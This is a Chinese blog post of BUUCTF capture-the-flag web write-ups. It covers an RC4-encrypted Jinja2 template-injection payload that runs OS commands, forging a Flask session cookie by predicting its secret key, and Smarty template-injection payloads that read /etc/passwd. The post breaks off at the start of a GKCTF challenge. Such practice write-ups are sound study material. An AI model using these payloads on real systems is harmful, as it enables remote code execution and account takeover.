<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BUUCTF(三) | wanan</title><meta name="keywords" content="CTF,BUUCTF"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="rc4模板注入 不知道啥意思,抓包看看  没东西,是不是要输入secret   尝试模板注入发现报错  因为我们是传的secret参数,所以我们之间搜索secret参数  import base64from urllib.parse import quotedef rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&amp;q">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF(三)">
<meta property="og:url" content="https://www.wanan.red/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%B8%89)/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="rc4模板注入 不知道啥意思,抓包看看  没东西,是不是要输入secret   尝试模板注入发现报错  因为我们是传的secret参数,所以我们之间搜索secret参数  import base64from urllib.parse import quotedef rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&amp;q">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg">
<meta property="article:published_time" content="2022-08-30T06:20:54.252Z">
<meta property="article:modified_time" content="2022-08-30T04:52:29.988Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="BUUCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/%E9%9D%B6%E5%9C%BA/BUUCTF(%E4%B8%89)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-e6YD56vlMd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BUUCTF(三)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-30 12:52:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF(三)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-30T06:20:54.252Z" title="发表于 2022-08-30 14:20:54">2022-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-30T04:52:29.988Z" title="更新于 2022-08-30 12:52:29">2022-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>42分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUUCTF(三)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="rc4模板注入"><a href="#rc4模板注入" class="headerlink" title="rc4模板注入"></a>rc4模板注入</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412155207786.png" alt="image-20220412155207786"></p>
<p>不知道啥意思,抓包看看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412155451876.png" alt="image-20220412155451876"></p>
<p>没东西,是不是要输入secret</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412155506547.png" alt="image-20220412155506547"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412155635575.png" alt="image-20220412155635575"></p>
<p>尝试模板注入发现报错</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412155737591.png" alt="image-20220412155737591"></p>
<p>因为我们是传的secret参数,所以我们之间搜索secret参数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412160440375.png" alt="image-20220412160440375"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse import quote</span><br><span class="line">def <span class="title function_ invoke__">rc4_main</span>(key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = <span class="title function_ invoke__">rc4_init_sbox</span>(key)</span><br><span class="line">    crypt = <span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">rc4_excrypt</span>(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line">def <span class="title function_ invoke__">rc4_init_sbox</span>(key):</span><br><span class="line">    s_box = <span class="keyword">list</span>(<span class="title function_ invoke__">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="title function_ invoke__">ord</span>(key[i % <span class="title function_ invoke__">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line">def <span class="title function_ invoke__">rc4_excrypt</span>(plain, box):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s in plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.<span class="title function_ invoke__">join</span>(res)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %<span class="title function_ invoke__">quote</span>(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="title function_ invoke__">str</span>(base64.<span class="title function_ invoke__">b64encode</span>(cipher.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#需要加密的字符串在这里修改</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c.__name__ == &#x27;</span>catch_warnings<span class="string">&#x27; %&#125;</span></span><br><span class="line"><span class="string">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span></span><br><span class="line"><span class="string">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span></span><br><span class="line"><span class="string">    &#123;% if &#x27;</span><span class="keyword">eval</span><span class="string">&#x27; in b.keys() %&#125;    </span></span><br><span class="line"><span class="string">      &#123;&#123; b[&#x27;</span><span class="keyword">eval</span><span class="string">&#x27;](&#x27;</span><span class="title function_ invoke__">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls /&quot;</span>).<span class="title function_ invoke__">read</span>()<span class="string">&#x27;) &#125;&#125; </span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">  &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">  &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">rc4_main</span>(<span class="string">&quot;HereIsTreasure&quot;</span>,payload)</span><br><span class="line"><span class="comment">#.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C2%811%29%C3%976N%C2%84%C2%BA%04.%C3%8A%C2%9A%18%C2%B7L%05%7Bw%C2%B4%12%C2%9B~%C3%A3%7D%C2%87kQ%01%21D%C2%9D%C3%98R%C2%B6%C2%B1%C2%B5%C2%80%C2%AE%C3%84%C3%BBJ%08%C3%98%C2%9C%C3%B7%C3%B7%C3%A9uT%C2%A7%C2%86%15%C2%8D%2C%14%19%C2%9B%C2%BAu%3E%2BEq%C3%A3%C3%97%C3%95%1D%40%C2%AB/%0C%17%C3%90l%C2%836%C2%BD%C3%96%C3%A9%2A%C3%B2%C2%B6Pz%C2%A2%C2%96o%C3%86q%0D%13y%C2%B0%C3%8F%C3%A6%C2%B3%C2%BC%C3%887Qql%03%C3%AA%24%C2%8E0%19%C2%B7%C3%836E0%C3%BC%C2%A6.%C2%AB%C3%9A%C3%B64%7C%C2%9F%09k%23%C3%A7%C2%86c%C3%85%C3%B2%C2%9Cf%C2%A7%C3%A5%C2%93i%C2%97%20%06%C3%B9%C3%99%C3%9C%C2%93Wo%C3%95%C3%AB%C3%AF%16%C2%A2e%C3%84%C2%B6u%1Bk%3D%C2%8Bc%C2%86%C2%A9c%C3%82%C2%AA.E-cHn%C2%9B%C2%BE%C3%A0%C3%98%C3%80%C3%AC%C3%92%5BD%0C%C2%86%C3%99%C3%9D%C2%8A%C3%AEf3b%C3%8E%C2%85%C2%91%C2%92%C3%B7K%C3%89%C2%BB%C2%8A%C3%B3%29%C3%98%00%C3%93W6P%C3%92%0D_%C3%91%C3%BD%12%C3%AC%C3%8A%3D%22%08e%C2%84%C2%9C%C2%AFD%C3%A1%02%C3%BCd%11%00%C2%B5%C2%95%C2%A9%C2%992924w%09%7D%1C%C2%A8%C3%A3/%C2%92%C3%A4%C3%89M%C3%A0%C2%A6%C3%A6%1D%C2%BB/H0%C3%B0%C2%BC%01b%25f%C2%BE%C2%B0%C2%91e8f%C3%83%C2%AC2%C3%9B%C2%BA%C3%B2%C2%BFk%2BH%C2%A5%05u%C3%BD%C3%8F%C2%9D%C3%BCq%C2%88%C2%BE%7B%02%C2%B1FL%5E/%C2%95%C3%A6%C3%81%10%C2%A8%C2%AC%1B%C2%9D%C2%B6%3D%C3%BEQW%083%C2%81%5B</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412161108902.png" alt="image-20220412161108902"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412161151000.png" alt="image-20220412161151000"></p>
<h1 id="flask框架session越权"><a href="#flask框架session越权" class="headerlink" title="flask框架session越权"></a>flask框架session越权</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412161723162.png" alt="image-20220412161723162"></p>
<p>试试是不是远程文件包含,发现不是,接着读取本地文件试试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412162216508.png" alt="image-20220412162216508"></p>
<p>我们查看一下本地进程&#x2F;proc&#x2F;self&#x2F;cmdline</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412163224916.png" alt="image-20220412163224916"></p>
<p>python的后台地址&#x2F;app&#x2F;app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>关键信息session&#x3D;&#x3D;fuck,那么我们需要去找flask的session处理方法,而flask session处理机制与SECRET_KEY有关.这里的secret_key生成利用了伪随机数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412174153626.png" alt="image-20220412174153626"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412174310611.png" alt="image-20220412174310611"></p>
<p>简单点就是需要获取靶机的mac地址,在linux下mac地址的位置是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412174517288.png" alt="image-20220412174517288"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12:c2:4b:05:46:0c</span><br></pre></td></tr></table></figure>

<p>接下来我们按照uuid.getnode生成secret_key,记得要用python2哦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&#x27;12:c2:4b:05:46:0c&#x27;</span></span><br><span class="line">nmac = mac.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">random.seed(<span class="built_in">int</span>(nmac, <span class="number">16</span>))  <span class="comment"># 将字符串转换成16进制int类型在传入seed</span></span><br><span class="line">key = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"><span class="comment">#187.411379406</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py decode -c &quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.YlU11A.UWWy8w8BqkOlDxHG8Pii9fPRJqM&quot;</span><br><span class="line">&#123;&quot;username&quot;:&#123;&quot; b&quot;:&quot;d3d3LWRhdGE=&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">python2 flask_session_cookie_manager2.py encode -s 187.411379406 -t &quot;&#123;&#x27;username&#x27;:&#x27;fuck&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.YlVQRA.hUlU1YQYX_VZRpDRaOzkYelt9TQ</span><br></pre></td></tr></table></figure>

<p>解密与加密需要使用固定的格式不然会报错.解密出来的字符串不能直接更改值，需要改为键值的格式</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412181243817.png" alt="image-20220412181243817"></p>
<h1 id="smarty框架的ssti"><a href="#smarty框架的ssti" class="headerlink" title="smarty框架的ssti"></a>smarty框架的ssti</h1><p><strong>{php}{&#x2F;php}</strong></p>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p>
<p><strong>{literal}标签</strong></p>
<p>{literal}可以让一个模板区域的字符原样输出,这经常用于保护页面上的javascript或者css样式表,比曼因为smarty的定界符而错被解析</p>
<p><strong>getstreamvariable</strong></p>
<p>可以读取一个文件返回其内容,可以用sekf来获取smarty对象并调用这个方法</p>
<p>新版本smarty已将该静态方法删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p><strong>{if}标签</strong></p>
<p>smary的{if}条件判断和php的if非常相似,只是增加了一些特性,每一个{if}必须有一个配对的{&#x2F;if}.也可以使用{else}和{elseif}.全部的php条件表达式和函数都可以在if内使用,如||,or,&amp;&amp;,and,is_array(), 等等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184017205.png" alt="image-20220412184017205"></p>
<p>题目打开发现提示了smarty框架</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184048944.png" alt="image-20220412184048944"></p>
<p>去访问这些页面也发现无法访问,但是在右上有cuurent ip 在下面也提示有X-Forwared-For</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184208636.png" alt="image-20220412184208636"></p>
<p>发现是输入什么就显示什么说明可能存在模板注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184258093.png" alt="image-20220412184258093"></p>
<p>发现成功执行了,接着我们使用if语句执行命令试试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184345827.png" alt="image-20220412184345827"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184432201.png" alt="image-20220412184432201"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220412184448449.png" alt="image-20220412184448449"></p>
<h1 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425160534111.png" alt="image-20220425160534111"></p>
<p>注册显示没有权限</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425160545557.png" alt="image-20220425160545557"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425160617732.png" alt="image-20220425160617732"></p>
<p>看到有发包,我们注册试试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161430561.png" alt="image-20220425161430561"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425161436637.png" alt="image-20220425161436637"></p>
